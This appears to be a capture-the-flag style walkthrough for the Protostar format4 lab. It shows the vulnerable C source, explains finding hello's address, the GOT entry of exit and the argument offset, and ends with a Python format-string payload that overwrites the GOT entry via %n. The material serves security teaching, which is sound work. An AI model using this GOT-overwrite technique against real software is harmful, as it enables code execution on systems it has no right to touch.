# Protostar - format4

## Analyzing the source code

```text
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}
```

As this is a [format string](https://www.youtube.com/watch?v=0WvrSfcdq1I&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=18) challenge we will attack through the `prinf` in line 20. This command is immediately followed by an `exit` so changing the return address of the function is of no use. Instead, we are going to manipulate the [got.plt](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html) registry of `exit` , forcing it to call `hello` instead. 

## Gathering Information

Before we can write the exploit itself we need to answer some questions:

#### What is the address of `hello`?

Grab it using gdb:

![](../.gitbook/assets/image%20%2862%29.png)

#### What is the location of `exit`'s got.plt?

Using `objdump -TR` we can see it's `0x08049724`.

![](../.gitbook/assets/image%20%2865%29.png)

You can also use gdb to find `exit@plt` with `i functions exit`, print its contents with `disas` and see than the first line jumps to what's located in `0x08049724`.

#### At which offset can we input values?

To find the offset at which we are starting to read from the buffer try something in the lines of:

![](../.gitbook/assets/image%20%2863%29.png)

We can use variables starting with the fourth.

## Exploiting

In `printf`'s [man page](https://linux.die.net/man/3/printf), under the bugs section it says:

![](../.gitbook/assets/image%20%2864%29.png)

We can write an address, and %n will write data there! But what will be written?

> ...the number of characters written so far is stored. \[[source](https://stackoverflow.com/questions/3401156/what-is-the-use-of-the-n-format-specifier-in-c)\]

The value we need to write is huge! To get over it we will write the data in three parts - LSB byte, two middle bytes, and MSB byte. To set the offset we need to insert values between the `%n`'s, that will be done using %SIZEx which translates to the padding of SIZE.

```text
#!/usr/bin/python3

import sys

exit_lsb_address = b"\x24\x97\x04\x08"
exit_mid_address = b"\x25\x97\x04\x08"
exit_msb_address = b"\x27\x97\x04\x08"

lsb_offset = b"%167x "
mid_offset = b"%974x "
msb_offset = b"%130x "

payload = b""
payload += exit_lsb_address + exit_mid_address + exit_msb_address + \
           lsb_offset + "%4$n ".encode() + mid_offset + "%5$n ".encode() + \
           msb_offset +  "%6$n ".encode()

sys.stdout.buffer.write(payload)
```

#### Two notes

* The overall structure of the payload is:
  * Three write addresses
  * 3 Times - Offset to achieve good value, write to address with %INDEXn \[INDEX which we discovered earlier\]. 
* I used `sys.stdout.buffer.write` to print the exact values without UTF-8. There are other ways to achieve this.

